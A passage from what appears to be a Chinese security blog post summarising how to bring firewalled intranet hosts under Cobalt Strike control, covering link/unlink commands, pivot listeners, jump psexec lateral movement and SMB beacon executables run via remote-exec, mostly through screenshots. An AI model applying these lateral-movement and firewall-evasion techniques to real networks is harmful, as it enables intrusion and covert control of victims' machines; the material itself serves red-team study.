<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831101807854.png" alt="image-20200831101807854"></p>
<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831101834919.png" alt="image-20200831101834919"></p>
<p>​        上线后根据自己的需要执行对应的操作即可</p>
<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831101901136.png" alt="image-20200831101901136"></p>
<p>​        当使用结束后，可以使用unlink命令取消和该内网主机的连接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unlink 192.168.3.73</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831102021398.png" alt="image-20200831102021398"></p>
<p>​        当想再次让该断网主机上线，使用link命令连接即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">link 192.168.3.73</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831102234598.png" alt="image-20200831102234598"></p>
<p><strong>Pivot listener和smb beacon在使用上的区别</strong></p>
<ul>
<li><p>使用pivot listener可以使用生成executables来上线，也可以使用jumpexec的方式上线</p>
<p>​    首先创建一个pivot listener test666</p>
<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831114634920.png" alt="image-20200831114634920"></p>
<p>​        配置这里还是要注意应该选择和断网机所在一个C段的ip，我这里是192.168.3.144</p>
</li>
</ul>
<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831114730991.png" alt="image-20200831114730991"></p>
<p>​            使用ipc和目标主机建立连接，使用jump psexec来让目标主机上线，test666为刚刚创建的pivote listener的名字</p>
<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831115052331.png" alt="image-20200831115052331"></p>
<p>​        成功上线</p>
<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831115201232.png" alt="image-20200831115201232"></p>
<ul>
<li>使用smb beacon可以使用jumpexec的方式上线，但不能使用生成executables来上线</li>
</ul>
<p>Attacks-&gt;packages-&gt;windows executable(s),listener选择smb</p>
<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831112921031.png" alt="image-20200831112921031"></p>
<p>​        将生成的文件上传到目标主机</p>
<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831113055853.png" alt="image-20200831113055853"></p>
<p>​        使用remote-exec来执行beacon.exe</p>
<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831114043504.png" alt="image-20200831114043504"></p>
<p>​        目标主机成功执行beacon.exe，但是并不能上线</p>
<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831114118504.png" alt="image-20200831114118504"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​        最后我总结一下这两种上线方式的使用区别</p>
<ul>
<li>pivot listener主要使用端口转发的方式来上线断网主机，这种方式会在我们的边界主机上开放一个端口，如果目标内网存在防火墙，则有可能无法使用这种方式来进行横向移动，但是使用这种方式既可以使用生成exe并执行的方式来上线，也可以使用psexec的方式来上线断网机。</li>
<li>使用smb beacon仅仅需要可以和目标的445端口进行通信即可，不需要额外开启其他端口，并且使用smb上线可以规避防火墙。但是这种方式不能使用生成exe并执行的方式上线，只能通过使用psexec的方式上线。</li>
</ul>
<p><strong>参考文章</strong></p>
<p><a href="https://pythonpig.github.io/2018/01/17/Cobaltstrike-SMB-beacon/" target="_blank" rel="noopener">Cobaltstrike SMB beacon(命名管道相关知识)</a></p>
<p><a href="http://blog.leanote.com/post/snowming/8b7ce0f84c03" target="_blank" rel="noopener">CS 4.0 SMB Beacon</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

  </div>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let activeClass = CONFIG.comments.activeClass;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">藏青</p>
  <div class="site-description" itemprop="description">知行合一</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">33</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">9</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">17</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">藏青</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.2.0
  </div>
  <span class="post-meta-divider">|</span>
  <div class="theme-info">Theme – <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.7.1
  </div>

    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
